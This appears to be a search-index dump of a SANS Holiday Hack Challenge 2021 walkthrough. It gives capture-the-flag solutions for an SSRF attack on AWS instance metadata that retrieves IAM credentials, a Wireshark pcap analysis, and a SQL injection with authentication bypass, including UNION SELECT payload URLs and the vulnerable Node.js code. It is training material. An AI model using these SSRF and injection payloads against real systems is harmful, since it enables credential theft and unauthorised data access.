to play without performing any OSINIT analysis. Location Guide Hints Antwerp, Belgium Their next waypoint was something like 51.219, 4.402 They just contacted us from an address in the 81.244.0.0/14 range. 5.0C and patchy light rain. Copenhagen, Denmark The elf wanted to drink gl\u00f8gg in Tivoli Gardens. Image of a green elf with EXIF GPS coordinates (55.684685, 12.579486) 0.0C and light snow conditions. Edinburgh, Scotland I'm not sure what a hogmanay is, but that elf wants to experience one just after Christmas. Image of a pink elf with EXIF GPS coordinates (55.948570, -3.199920) 6.0 C and moderate rain conditions. London, England They said, if asked, they would describe their next location in three words as \"frozen, push, and tamed.\" They were checking the Ofcom frequency table to see what amateur frequencies they could use while there. 11.0C and overcast conditions. Montreal, Canada I think they left to check out the D\u00e9fil\u00e9 de No\u00ebl. They called me and mentioned they were connected via Rogers Wireless. -12.0C and sunny conditions. New York, USA Buddy, a close friend of the elves, once went on an ice skating date under their huge Christmas tree! Image of a blue elf with EXIF GPS coordinates (40.758634, -73.978421) 1.7C and partly cloudy conditions Prague, Czech Republic They were excited about checking out the V\u00e1no\u010dn\u00ed trhy. They said something about NATO and 33U VR 58560 48464. /shrug 0.0C and partly cloudy conditions Reykjavik, Iceland They said, if asked, they would describe their next location as \"staring desire frost.\" Having trouble typing that letter? It's UNICODE 00ED or 0237 on the number pad in Windows. 0.0C and clear conditions Rovaniemi, Finland I've heard that when British children put letters to Father Christmas in the fireplace, they magically end up there! They just contacted us from an address in the 80.95.128.0/20 range. -11.0C and clear conditions Stuttgart, Germany They said something about MGRS and 32U NU 05939 98268... Apparently they really wanted to see what a town hall looks like when it's converted into a giant Advent calendar! 7.0C and clear conditions. Tokyo, Japan They said, if asked, they would describe their next location as \"only milder vanilla.\" They were excited that their phone was going to work on the 1500 MHz LTE band 7.0C and partly cloudy conditions Vienna, Austria They said they wanted to visit Christmas markets - like Christkindlmarkt and Spittelberg, enjoy fried sausages and goulash soup, and drink hot Christmas punch. They just contacted us from an address in the 137.208.0.0/16 range -2.0C and partly cloudy conditions","title":"All Location Hints"},{"location":"extras/T4_Logic_Munchers/","text":"Extra content for the Logic Munchers Terminal Challenge All the Hints At each difficulty level the game will provide you with some techniques for solving the logic equations. This table lists all the hints in one easy to read location. Difficulty Hint Beginner - Boolean Eat only \"True\" and \"not False\" challenges - or like \"0=0\". Intermediate - Boolean If A and B are both true, then \"A and B\" is true. If either is true, then \"A or B\" is true. Advanced - Boolean Don't get thrown off; \"not True\" is the same as \"False,\" and vice versa. Expert - Boolean Try reducing the contents of parenthesis to \"True\" or \"False,\" then solve the simplified statement. Beginner - Arithmetic The \"!=\" operator means \"is not equal to.\" Intermediate - Arithmetic Don't get thrown off by negative results Advanced - Arithmetic The \"%\" or \"modulo\" operator asks the remainder when numbers are divided. Expert - Arithmetic If you see the \"**\" operator, it means \"to the power of.\" Beginner / Intermediate - Number Conversions 0b0001 in binary is 1 in decimal, 0b0010 is 2, 0b0011 is 3, 0b0100 is 4... Advanced / Expert - Number Conversions 0x09 in hexadecimal is 9 in decimal, 0x0A is 10, 0x0F is 15, 0x10 is 16... Beginner - Bitwise The \"bit shift\" operators slide bits left or right with a fresh \"0.\" Intermediate - Bitwise A bitwise AND(&) is like a logical \"And\" where 1 = true and 0 = false. OR( Advanced / Expert - Bitwise A bitwise XOR(^ or \u2295) returns 1 only when exactly one of the input bits is 1.","title":"Extra Content for Logic Munchers"},{"location":"extras/T4_Logic_Munchers/#extra-content-for-the-logic-munchers-terminal-challenge","text":"","title":"Extra content for the Logic Munchers Terminal Challenge"},{"location":"extras/T4_Logic_Munchers/#all-the-hints","text":"At each difficulty level the game will provide you with some techniques for solving the logic equations. This table lists all the hints in one easy to read location. Difficulty Hint Beginner - Boolean Eat only \"True\" and \"not False\" challenges - or like \"0=0\". Intermediate - Boolean If A and B are both true, then \"A and B\" is true. If either is true, then \"A or B\" is true. Advanced - Boolean Don't get thrown off; \"not True\" is the same as \"False,\" and vice versa. Expert - Boolean Try reducing the contents of parenthesis to \"True\" or \"False,\" then solve the simplified statement. Beginner - Arithmetic The \"!=\" operator means \"is not equal to.\" Intermediate - Arithmetic Don't get thrown off by negative results Advanced - Arithmetic The \"%\" or \"modulo\" operator asks the remainder when numbers are divided. Expert - Arithmetic If you see the \"**\" operator, it means \"to the power of.\" Beginner / Intermediate - Number Conversions 0b0001 in binary is 1 in decimal, 0b0010 is 2, 0b0011 is 3, 0b0100 is 4... Advanced / Expert - Number Conversions 0x09 in hexadecimal is 9 in decimal, 0x0A is 10, 0x0F is 15, 0x10 is 16... Beginner - Bitwise The \"bit shift\" operators slide bits left or right with a fresh \"0.\" Intermediate - Bitwise A bitwise AND(&) is like a logical \"And\" where 1 = true and 0 = false. OR( Advanced / Expert - Bitwise A bitwise XOR(^ or \u2295) returns 1 only when exactly one of the input bits is 1.","title":"All the Hints"},{"location":"objectives/O10_Now_Hiring/","text":"Objective 10) How Hiring! Difficulty : What is the secret access key for the Jack Frost Tower job applications server ? Brave the perils of Jack's bathroom to get hints from Noxious O'Dor. Hints and Resources Hints provided after helping Noxious O'Dor and completing the IMDS Exploration Terminal Challenge AWS IMDS Documentation The AWS documentation for IMDS is interesting reading. Other statements made by Noxious O'Dor after completing the IMDS Exploration challenge \"I'm very concerned about the combination of SSRF and IMDS access.\" \"Dr. Petabyte told us, \"anytime you see URL as an input, test for SSRF.\" \"With an SSRF attack, we can make the server request a URL. This can reveal valuable data!\" Solution Exploring the web site https://apply.jackfrosttower.com/ we find that the \"Apply\" page gives us a way to supply user input, and one of the fields is intended to be the URL to our Naughty List Background Investigation report. Cloud resources can sometimes have access to their Cloud Service Provider's Instance Metadata Service (IMDS) using the non-routable IP address 169.254.169.254. If the server processing the web form does not have protections against Server Side Request Forgery, then we may be able to use this field to get the server to reveal IMDS information. So the first logical thing to try is to just put the IMDS url http://169.254.169.254 in to the field and see what happens. Screenshot The result is a 'Submission Accepted' page. In the middle of the page is what looks like a broken link, which if we inspect we see goes to 'https://apply.jackfrosttower.com/images/Nutmeg.jpg'. Screenshot Suspecting that this isn't actually a JPG file we can use a tool like cURL to retrieve the raw contents of the file instead. Doing so we learn that it contains the output that we could expect from the cloud IMDS service. So the URL we are entering in the form is being evaluated by the server and is able to access IMDS. Now we just need to compose the IMDS request that will give us the access key. First we need to get the identity and access roles, which we learned in the IMDS Exploration tutorial is the URL http://169.254.169.254/latest/meta-data/iam/security-credentials We enter that into the Apply page URL field, submit again, then use cURL as before to read the results. Now we know there is a single IAM role, jf-deploy-role, so we repeat the process to retrieve the Access Key for this role. http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role Completion Answer CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX","title":"10) Now Hiring!"},{"location":"objectives/O10_Now_Hiring/#objective-10-how-hiring","text":"Difficulty : What is the secret access key for the Jack Frost Tower job applications server ? Brave the perils of Jack's bathroom to get hints from Noxious O'Dor.","title":"Objective 10) How Hiring!"},{"location":"objectives/O10_Now_Hiring/#hints-and-resources","text":"Hints provided after helping Noxious O'Dor and completing the IMDS Exploration Terminal Challenge AWS IMDS Documentation The AWS documentation for IMDS is interesting reading. Other statements made by Noxious O'Dor after completing the IMDS Exploration challenge \"I'm very concerned about the combination of SSRF and IMDS access.\" \"Dr. Petabyte told us, \"anytime you see URL as an input, test for SSRF.\" \"With an SSRF attack, we can make the server request a URL. This can reveal valuable data!\"","title":"Hints and Resources"},{"location":"objectives/O10_Now_Hiring/#solution","text":"Exploring the web site https://apply.jackfrosttower.com/ we find that the \"Apply\" page gives us a way to supply user input, and one of the fields is intended to be the URL to our Naughty List Background Investigation report. Cloud resources can sometimes have access to their Cloud Service Provider's Instance Metadata Service (IMDS) using the non-routable IP address 169.254.169.254. If the server processing the web form does not have protections against Server Side Request Forgery, then we may be able to use this field to get the server to reveal IMDS information. So the first logical thing to try is to just put the IMDS url http://169.254.169.254 in to the field and see what happens. Screenshot The result is a 'Submission Accepted' page. In the middle of the page is what looks like a broken link, which if we inspect we see goes to 'https://apply.jackfrosttower.com/images/Nutmeg.jpg'. Screenshot Suspecting that this isn't actually a JPG file we can use a tool like cURL to retrieve the raw contents of the file instead. Doing so we learn that it contains the output that we could expect from the cloud IMDS service. So the URL we are entering in the form is being evaluated by the server and is able to access IMDS. Now we just need to compose the IMDS request that will give us the access key. First we need to get the identity and access roles, which we learned in the IMDS Exploration tutorial is the URL http://169.254.169.254/latest/meta-data/iam/security-credentials We enter that into the Apply page URL field, submit again, then use cURL as before to read the results. Now we know there is a single IAM role, jf-deploy-role, so we repeat the process to retrieve the Access Key for this role. http://169.254.169.254/latest/meta-data/iam/security-credentials/jf-deploy-role","title":"Solution"},{"location":"objectives/O10_Now_Hiring/#completion","text":"Answer CGgQcSdERePvGgr058r3PObPq3+0CfraKcsLREpX","title":"Completion"},{"location":"objectives/O11_Customer_Complaint_Analysis/","text":"Objective 11) Customer Complaint Analysis Difficulty : A human has accessed the Jack Frost Tower network with a non-compliant host. Which three trolls complained about the human ? Enter the troll names in alphabetical order separated by spaces. Talk to Tinsel Upatree in the kitchen for hints. Hints and Resources Hints provided after helping Tinsel Upatree and completing the Strace, Ltrace, Retrace Terminal Challenge Evil Bit RFC RFC3514 defines the usage of the \"Evil Bit\" in IPv4 headers. Wireshark Display Filters Different from BPF capture filters, Wireshark's display filters can find text with the contains keyword - and evil bits with ip.flags.rb . Other Resources Wireshark https://wireshark.org/#download KringleCon Talk RFC-3514 Compliant Pentesting: Being Good While You're Being Bad - Tom Liston Troll Introduction Talk to Pat Tronizer in the Frost Fest Talks Lobby Hrmph. Oh hey, I'm Pat Tronizer. I'm SO glad to have all these first-rate talks here. We issued a Call for Talks, but only one person responded\u2026 We put him in track 1. But Jack came up with an ingenious way to borrow additional talks for FrostFest! You can hardly tell where we got these great speakers! Anyway, I cannot believe an actual human connected to the Tower network . It\u2019s supposed to be the domain of us trolls and of course Jack Frost himself. Mr. Frost has a strict policy: all devices must be RFC3514 compliant. It fits in with our nefarious plans. Some human had the nerve to use our complaint website to submit a complaint! That website is for trolls to complain about guests, NOT the other way around. Humans have some nerve. Setup Download and install Wireshark on your device if it isn't already (default options should be fine). Solution Download the zip file linked to in the objective description or Pat's introduction. Unzip it to get the jackfrosttower-network.pcap file and open it with Wireshark. Screenshot Apply the filter ip.flags.rb == 0 to show only those packets that don't have the \"Evil Bit\" set. In other words, the non-Troll data. Looking at the results we find one packet that is an HTTP POST. Select it and expand the HTML Form in the Packet Details to read the details of the complaint submission. Screenshot In the guest_info form item we see that the human, Muffy VonDuchess Sebastian, was residing in room 1024. We now apply the filter tcp contains \"1024\" to get any packets referencing that room. This results in 4 POST requests, which we can look at in turn to find the names of the 3 trolls that complained about Muffy. Screenshots Completion Answer Flud Hagg Yaqh Extra To see all the customer complaint submissions, see this table in the Extras section.","title":"11) Customer Complaint Analysis"},{"location":"objectives/O11_Customer_Complaint_Analysis/#objective-11-customer-complaint-analysis","text":"Difficulty : A human has accessed the Jack Frost Tower network with a non-compliant host. Which three trolls complained about the human ? Enter the troll names in alphabetical order separated by spaces. Talk to Tinsel Upatree in the kitchen for hints.","title":"Objective 11) Customer Complaint Analysis"},{"location":"objectives/O11_Customer_Complaint_Analysis/#hints-and-resources","text":"Hints provided after helping Tinsel Upatree and completing the Strace, Ltrace, Retrace Terminal Challenge Evil Bit RFC RFC3514 defines the usage of the \"Evil Bit\" in IPv4 headers. Wireshark Display Filters Different from BPF capture filters, Wireshark's display filters can find text with the contains keyword - and evil bits with ip.flags.rb . Other Resources Wireshark https://wireshark.org/#download KringleCon Talk RFC-3514 Compliant Pentesting: Being Good While You're Being Bad - Tom Liston","title":"Hints and Resources"},{"location":"objectives/O11_Customer_Complaint_Analysis/#troll-introduction","text":"Talk to Pat Tronizer in the Frost Fest Talks Lobby Hrmph. Oh hey, I'm Pat Tronizer. I'm SO glad to have all these first-rate talks here. We issued a Call for Talks, but only one person responded\u2026 We put him in track 1. But Jack came up with an ingenious way to borrow additional talks for FrostFest! You can hardly tell where we got these great speakers! Anyway, I cannot believe an actual human connected to the Tower network . It\u2019s supposed to be the domain of us trolls and of course Jack Frost himself. Mr. Frost has a strict policy: all devices must be RFC3514 compliant. It fits in with our nefarious plans. Some human had the nerve to use our complaint website to submit a complaint! That website is for trolls to complain about guests, NOT the other way around. Humans have some nerve.","title":"Troll Introduction"},{"location":"objectives/O11_Customer_Complaint_Analysis/#setup","text":"Download and install Wireshark on your device if it isn't already (default options should be fine).","title":"Setup"},{"location":"objectives/O11_Customer_Complaint_Analysis/#solution","text":"Download the zip file linked to in the objective description or Pat's introduction. Unzip it to get the jackfrosttower-network.pcap file and open it with Wireshark. Screenshot Apply the filter ip.flags.rb == 0 to show only those packets that don't have the \"Evil Bit\" set. In other words, the non-Troll data. Looking at the results we find one packet that is an HTTP POST. Select it and expand the HTML Form in the Packet Details to read the details of the complaint submission. Screenshot In the guest_info form item we see that the human, Muffy VonDuchess Sebastian, was residing in room 1024. We now apply the filter tcp contains \"1024\" to get any packets referencing that room. This results in 4 POST requests, which we can look at in turn to find the names of the 3 trolls that complained about Muffy. Screenshots","title":"Solution"},{"location":"objectives/O11_Customer_Complaint_Analysis/#completion","text":"Answer Flud Hagg Yaqh","title":"Completion"},{"location":"objectives/O11_Customer_Complaint_Analysis/#extra","text":"To see all the customer complaint submissions, see this table in the Extras section.","title":"Extra"},{"location":"objectives/O12_Frost_Tower_Website_Checkup/","text":"Objective 12) Frost Tower Website Checkup Difficulty : Investigate Frost Tower's website for security issues . This source code will be useful in your analysis . In Jack Frost's TODO list, what job position does Jack plan to offer Santa? Ribb Bonbowford, in Santa's dining room, may have some pointers for you. Hints and Resources Hints provided after helping Rib Bonbowford and completing the Elf Code Python Terminal Challenge SQL Injection with Source When you have the source code, API documentation becomes tremendously valuable . Troll Introduction Talk to Ingreta Tude in Jack's Studio Hey there! I\u2019m Ingreta Tude. I really don\u2019t like the direction Jack Frost is leading us. He seems obsessed with beating Santa and taking over the holiday season. It just doesn\u2019t seem right. Why can\u2019t we work together with Santa and the elves instead of trying to beat them? But, I do have an Objective for you. We\u2019re getting ready to launch a new website for Frost Tower, and the big guy has charged me with making sure it\u2019s secure. My sister, Ruby Cyster, created this site, and I don\u2019t trust the results. Can you please take a look at it to find flaws? Here is the source code if you need it. Solution Step 1: Finding the SQL Injection Point Opening the web site we see only a home page with a place to enter an email contact addres. However, looking through the main file of the source code, server.js, we see that there are a number of additional endpoints available. Inspecting the code we find that the /detail endpoint provides us with an opportunitty to inject SQL server.js 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 app . get ( '/detail/:id' , function ( req , res , next ) { session = req . session ; var reqparam = req . params [ 'id' ]; var query = \"SELECT * FROM uniquecontact WHERE id=\" ; if ( session . uniqueID ){ try { if ( reqparam . indexOf ( ',' ) > 0 ){ var ids = reqparam . split ( ',' ); reqparam = \"0\" ; for ( var i = 0 ; i < ids . length ; i ++ ){ query += tempCont . escape ( m . raw ( ids [ i ])); query += \" OR id=\" } query += \"?\" ; } else { query = \"SELECT * FROM uniquecontact WHERE id=?\" } } catch ( error ) { console . log ( error ); return res . sendStatus ( 500 ); } tempCont . query ( query , reqparam , function ( error , rows , fields ){ This endpoint allows the user to specify one or more contact IDs to view by supplying them as the last element of the URL, such as https://staging.jackfrosttower.com/detail/1234 If a single ID is requested then the code at line 212 constructs the query as SELECT * FROM uniquecontact WHERE id=? and the '?' placeholder is substituted with the ID when the query is executed on line 219. MySQLjs automatically escapes any values passed this way, so injecting SQL using this method will not work. However, if more than one ID is requested by separating them with commas, then the code on lines 204-210 build the query with whatever was used for the IDs built in. For example, the URL https://staging.jackfrosttower.com/detail/1,2 will result in the following query being built SELECT # FROM uniquecontact WHERE id=1 or ID=2 OR id=? This gives us an opportunity to inject code, but first we have to bypass the authentication. Step 2: Authentication Bypass In order to use the /detail endpoint we need to pass the authentication check on line 200. On a sucessful login the session.uniqueID value is defined to be our username, but if we haven't logged in it will be undefined. But further inspection of the code reveals a flaw in the /postcontact endpoint. This endpoint is called after pressing 'Save' on the 'Contact Us' page, and includes the following bit of code. server.js 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 tempCont . query ( \"SELECT * from uniquecontact where email=\" + tempCont . escape ( email ), function ( error , rows , fields ){ if ( error ) { console . log ( error ); return res . sendStatus ( 500 ); } var rowlength = rows . length ; if ( rowlength >= \"1\" ){ session = req . session ; session . uniqueID = email ; req . flash ( 'info' , 'Email Already Exists' ); res . redirect ( \"/contact\" ); } else { tempCont . query ( \"INSERT INTO uniquecontact (full_name, email, phone, country, date_created) VALUE (?, ?, ?, ?, ?)\" , [ fullname , email , phone , country , date_created ], function ( error , rows , fields ) { Here we see that if the email address entered into the 'Contact Us' page doesn't exist (line 149 evaluates as False), then line 157 adds a new record to the uniquecontact table. If however the email address already exists in the table, then line 151 will set session.uniqueID to that value. Since the check in the /detail endpoint is just looking to see if session.uniqueID is set to something, this means if we submit a 'Contact Us' form twice using the same email then we will pass the authentication check. Step 3: SQL Injection Constraints Now that we are 'authenticated' to the system we can try to inject code using the /details endpoint. One of the more common SQL Injection techniques involves the use of a UNION SELECT statement. This statement will execute a second SELECT and combines its results with the first. One of the requiements however when using a UNION SELECT is that the second SELECT statement must return the same number of columns as the first. For example, the URL https://staging.jackfrosttower.com/detail/1 UNION SELECT name FROM users;--,2 will be expanded by the code into the full query SELECT * FROM uniquecontact WHERE id=1 UNION SELECT name FROM users;-- OR ID=2 OR ID=? Note that I'm adding the comment characters ;-- at the end of my injection so everything after that will be ignored . This query will result in an error because the first select, SELECT * FROM uniquecontact WHERE id=1 , returns 7 columns and SELECT name FROM users only returns 1 column. Additionally, after the /detail endpoint retreives values from the database it passes them to the detail.ejs file for rendering (see line 236 in server.js). The detail.ejs file requires that the values passed to it 'fit' into the structure of the uniquecontact table, shown below from the script used to initialize the database. encontact_db.sql 8 9 10 11 12 13 14 15 16 17 CREATE TABLE `uniquecontact` ( `id` int ( 50 ) NOT NULL AUTO_INCREMENT , `full_name` varchar ( 255 ) DEFAULT NULL , `email` varchar ( 255 ) DEFAULT NULL , `phone` varchar ( 50 ) DEFAULT NULL , `country` varchar ( 255 ) DEFAULT NULL , `date_created` datetime DEFAULT NULL , `date_update` datetime DEFAULT NULL , PRIMARY KEY ( `id` ) ) ENGINE = InnoDB AUTO_INCREMENT = 33 DEFAULT CHARSET = latin1 ; So when we inject code into the /detail endpoint we need to make sure not only that we return 7 colunmns, but that the types of those values match as well. Fortunately NULL values match anything (see below). Step 4: Finding Jack's TODO List From what we see in the source there does not appear to be any table or field in the encontact database that might contain Jack's TODO list. However, there could be another table that we are not aware of. The MySQL query that would show use all the tables in the encontact database is SELECT table_name FROM information_schema.tables WHERE table_schema='encontact' . But as mentioned above, our injection needs to return 7 values and this query only returns one. To get around this we can use the JOIN statement to combine multiple SELECT statements into one result. SELECT * FROM (select NULL)c1 join (SELECT table_name FROM information_schema.tables WHERE table_schema='encontact')c2 join (select NULL)c3 join (select NULL)c4 join (select NULL)c5 join (select NULL)c6 join (select NULL)c7 This query would return 7 columns, the 2nd of which will be the names of the tables in the encontact database and the others all NULL. This query can be executed through SQL injection with the following URL https://staging.jackfrosttower.com/detail/1 UNION SELECT * FROM (select NULL)c1 join (SELECT table_name FROM information_schema.tables WHERE table_schema='encontact')c2 join (select NULL)c3 join (select NULL)c4 join (select NULL)c5 join (select NULL)c6 join (select NULL)c7;--,2 Screenshot Executing this injection tells us that there is another table named \"todo\" in the database. The MySQL query that would show all the column names for this table is SELECT column_name FROM information_schema.columns WHERE table_name='todo' which we can inject into the web site as well. https://staging.jackfrosttower.com/detail/1 UNION SELECT * FROM (select NULL)c1 join (SELECT column_name FROM information_schema.columns WHERE table_name='todo')c2 join (select NULL)c3 join (select NULL)c4 join (select NULL)c5 join (select NULL)c6 join (select NULL)c7;--,1 Screenshot Now we know there are three columns in the todo table, 'id', 'note', and 'completed', so we can compose our final query to retrieve all the rows of this table. Note that in this query we are using fewer join statements since the select from the todo table will return three columns. https://staging.jackfrosttower.com/detail/1 UNION SELECT * FROM (select NULL)c1 join (select * from todo)c2 join (select NULL)c5 join (select NULL)c6 join (select NULL)c7;--,1 Screenshot Completion Answer clerk Ingreta Tude Oh wow - I thought we left SQL injection in the last decade. Thanks for your help finding this! Extras For Jack's complete TODO list, see this table in the Extras section.","title":"12) Frost Tower Website Checkup"},{"location":"objectives/O12_Frost_Tower_Website_Checkup/#objective-12-frost-tower-website-checkup","text":"Difficulty : Investigate Frost Tower's website for security issues . This source code will be useful in your analysis . In Jack Frost's TODO list, what job position does Jack plan to offer Santa? Ribb Bonbowford, in Santa's dining room, may have some pointers for you.","title":"Objective 12) Frost Tower Website Checkup"},{"location":"objectives/O12_Frost_Tower_Website_Checkup/#hints-and-resources","text":"Hints provided after helping Rib Bonbowford and completing the Elf Code Python Terminal Challenge SQL Injection with Source When you have the source code, API documentation becomes tremendously valuable .","title":"Hints and Resources"},{"location":"objectives/O12_Frost_Tower_Website_Checkup/#troll-introduction","text":"Talk to Ingreta Tude in Jack's Studio Hey there! I\u2019m Ingreta Tude. I really don\u2019t like the direction Jack Frost is leading us. He seems obsessed with beating Santa and taking over the holiday season. It just doesn\u2019t seem right. Why can\u2019t we work together with Santa and the elves instead of trying to beat them? But, I do have an Objective for you. We\u2019re getting ready to launch a new website for Frost Tower, and the big guy has charged me with making sure it\u2019s secure. My sister, Ruby Cyster, created this site, and I don\u2019t trust the results. Can you please take a look at it to find flaws? Here is the source code if you need it.","title":"Troll Introduction"},{"location":"objectives/O12_Frost_Tower_Website_Checkup/#solution","text":"","title":"Solution"},{"location":"objectives/O12_Frost_Tower_Website_Checkup/#step-1-finding-the-sql-injection-point","text":"Opening the web site we see only a home page with a place to enter an email contact addres. However, looking through the main file of the source code, server.js, we see that there are a number of additional endpoints available. Inspecting the code we find that the /detail endpoint provides us with an opportunitty to inject SQL server.js 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 app . get ( '/detail/:id' , function ( req , res , next ) { session = req . session ; var reqparam = req . params [ 'id' ]; var query = \"SELECT * FROM uniquecontact WHERE id=\" ; if ( session . uniqueID ){ try { if ( reqparam . indexOf ( ',' ) > 0 ){ var ids = reqparam . split ( ',' ); reqparam = \"0\" ; for ( var i = 0 ; i < ids . length ; i ++ ){ query += tempCont . escape ( m . raw ( ids [ i ])); query += \" OR id=\" } query += \"?\" ; } else { query = \"SELECT * FROM uniquecontact WHERE id=?\" } } catch ( error ) { console . log ( error ); return res . sendStatus ( 500 ); } tempCont . query ( query , reqparam , function ( error , rows , fields ){ This endpoint allows the user to specify one or more contact IDs to view by supplying them as the last element of the URL, such as https://staging.jackfrosttower.com/detail/1234 If a single ID is requested then the code at line 212 constructs the query as SELECT * FROM uniquecontact WHERE id=? and the '?' placeholder is substituted with the ID when the query is executed on line 219. MySQLjs automatically escapes any values passed this way, so injecting SQL using this method will not work. However, if more than one ID is requested by separating them with commas, then the code on lines 204-210 build the query with whatever was used for the IDs built in. For example, the URL https://staging.jackfrosttower.com/detail/1,2 will result in the following query being built SELECT # FROM uniquecontact WHERE id=1 or ID=2 OR id=? This gives us an opportunity to inject code, but first we have to bypass the authentication.","title":"Step 1: Finding the SQL Injection Point"},{"location":"objectives/O12_Frost_Tower_Website_Checkup/#step-2-authentication-bypass","text":"In order to use the /detail endpoint we need to pass the authentication check on line 200. On a sucessful login the session.uniqueID value is defined to be our username, but if we haven't logged in it will be undefined. But further inspection of the code reveals a flaw in the /postcontact endpoint. This endpoint is called after pressing 'Save' on the 'Contact Us' page, and includes the following bit of code. server.js 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 tempCont . query ( \"SELECT * from uniquecontact where email=\" + tempCont . escape ( email ), function ( error , rows , fields ){ if ( error ) { console . log ( error ); return res . sendStatus ( 500 ); } var rowlength = rows . length ; if ( rowlength >= \"1\" ){ session = req . session ; session . uniqueID = email ; req . flash ( 'info' , 'Email Already Exists' ); res . redirect ( \"/contact\" ); } else { tempCont . query ( \"INSERT INTO uniquecontact (full_name, email, phone, country, date_created) VALUE (?, ?, ?, ?, ?)\" , [ fullname , email , phone , country , date_created ], function ( error , rows , fields ) { Here we see that if the email address entered into the 'Contact Us' page doesn't exist (line 149 evaluates as False), then line 157 adds a new record to the uniquecontact table. If however the email address already exists in the table, then line 151 will set session.uniqueID to that value. Since the check in the /detail endpoint is just looking to see if session.uniqueID is set to something, this means if we submit a 'Contact Us' form twice using the same email then we will pass the authentication check.","title":"Step 2: Authentication Bypass"},{"location":"objectives/O12_Frost_Tower_Website_Checkup/#step-3-sql-injection-constraints","text":"Now that we are 'authenticated' to the system we can try to inject code using the /details endpoint. One of the more common SQL Injection techniques involves the use of a UNION SELECT statement. This statement will execute a second SELECT and combines its results with the first. One of the requiements however when using a UNION SELECT is that the second SELECT statement must return the same number of columns as the first. For example, the URL https://staging.jackfrosttower.com/detail/1 UNION SELECT name FROM users;--,2 will be expanded by the code into the full query SELECT * FROM uniquecontact WHERE id=1 UNION SELECT name FROM users;-- OR ID=2 OR ID=? Note that I'm adding the comment characters ;-- at the end of my injection so everything after that will be ignored . This query will result in an error because the first select, SELECT * FROM uniquecontact WHERE id=1 , returns 7 columns and SELECT name FROM users only returns 1 column. Additionally, after the /detail endpoint retreives values from the database it passes them to the detail.ejs file for rendering (see line 236 in server.js). The detail.ejs file requires that the values passed to it 'fit' into the structure of the uniquecontact table, shown below from the script used to initialize the database. encontact_db.sql 8 9 10 11 12 13 14 15 16 17 CREATE TABLE `uniquecontact` ( `id` int ( 50 ) NOT NULL AUTO_INCREMENT , `full_name` varchar ( 255 ) DEFAULT NULL , `email` varchar ( 255 ) DEFAULT NULL , `phone` varchar ( 50 ) DEFAULT NULL , `country` varchar ( 255 ) DEFAULT NULL , `date_created` datetime DEFAULT NULL , `date_update` datetime DEFAULT NULL , PRIMARY KEY ( `id` ) ) ENGINE = InnoDB AUTO_INCREMENT = 33 DEFAULT CHARSET = latin1 ; So when we inject code into the /detail endpoint we need to make sure not only that we return 7 colunmns, but that the types of those values match as well. Fortunately NULL values match anything (see below).","title":"Step 3: SQL Injection Constraints"},{"location":"objectives/O12_Frost_Tower_Website_Checkup/#step-4-finding-jacks-todo-list","text":"From what we see in the source there does not appear to be any table or field in the encontact database that might contain Jack's TODO list. However, there could be another table that we are not aware of. The MySQL query that would show use all the tables in the encontact database is SELECT table_name FROM information_schema.tables WHERE table_schema='encontact' . But as mentioned above, our injection needs to return 7 values and this query only returns one. To get around this we can use the JOIN statement to combine multiple SELECT statements into one result. SELECT * FROM (select NULL)c1 join (SELECT table_name FROM information_schema.tables WHERE table_schema='encontact')c2 join (select NULL)c3 join (select NULL)c4 join (select NULL)c5 join (select NULL)c6 join (select NULL)c7 This query would return 7 columns, the 2nd of which will be the names of the tables in the encontact database and the others all NULL. This query can be executed through SQL injection with the following URL https://staging.jackfrosttower.com/detail/1 UNION SELECT * FROM (select NULL)c1 join (SELECT table_name FROM information_schema.tables WHERE table_schema='encontact')c2 join (select NULL)c3 join (select NULL)c4 join (select NULL)c5 join (select NULL)c6 join (select NULL)c7;--,2 Screenshot Executing this injection tells us that there is another table named \"todo\" in the database. The MySQL query that would show all the column names for this table is SELECT column_name FROM information_schema.columns WHERE table_name='todo' which we can inject into the web site as well. https://staging.jackfrosttower.com/detail/1 UNION SELECT * FROM (select NULL)c1 join (SELECT column_name FROM information_schema.columns WHERE table_name='todo')c2 join (select NULL)c3 join (select NULL)c4 join (select NULL)c5 join (select NULL)c6 join (select NULL)c7;--,1 Screenshot Now we know there are three columns in the todo table, 'id', 'note', and 'completed', so we can compose our final query to retrieve all the rows of this table. Note that in this query we are using fewer join statements since the select from the todo table will return three columns. https://staging.jackfrosttower.com/detail/1 UNION SELECT * FROM (select NULL)c1 join (select * from todo)c2 join (select NULL)c5 join (select NULL)c6 join (select NULL)c7;--,1 Screenshot","title":"Step 4: Finding Jack's TODO List"},{"location":"objectives/O12_Frost_Tower_Website_Checkup/#completion","text":"Answer clerk Ingreta Tude Oh wow - I thought we left SQL injection in the last decade. Thanks for your help finding this!","title":"Completion"},{"location":"objectives/O12_Frost_Tower_Website_Checkup/#extras","text":"For Jack's complete TODO list, see this table in the Extras section.","title":"Extras"},{"location":"objectives/O13_FPGA_Programming/","text":"Objective 13) FPGA Programming Difficulty : Write your first FPGA program to make a doll sing. You might get some suggestions from Grody Goiterson, near Jack's elevator. Note This objective unlocks after reaching the roof of Frost Tower Hints and Resources Hints provided after helping Grody Goiterson and completing the Frostavator Terminal Challenge FPGA for Fun There are FPGA enthusiast sites . FPGA Talk Prof. Qwerty Petabyte is giving a lesson about Field Programmable Gate Arrays (FPGAs). Other Resources Introduction Hint for Rounding Numbers If $rtoi(real_no * 10) - ($rtoi(real_no) * 10) > 4, add 1 Solution Open the FPGA Programming terminal on the roof of Frost Tower and program it so all tests pass and you are able to program the device. The Code There may be a more elegant way to do this but the following code will, at least in every test I ran, result in exact matches for any target frequency and will successfully complete the challenge. See below for an explanation of the math. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 // Note: For this lab, we will be working with QRP Corporation's CQC-11 FPGA. // The CQC-11 operates with a 125MHz clock. // Your design for a tone generator must support the following // inputs/outputs: // (NOTE: DO NOT CHANGE THE NAMES. OUR AUTOMATED GRADING TOOL // REQUIRES THE USE OF THESE NAMES!) // input clk - this will be connected to the 125MHz system clock // 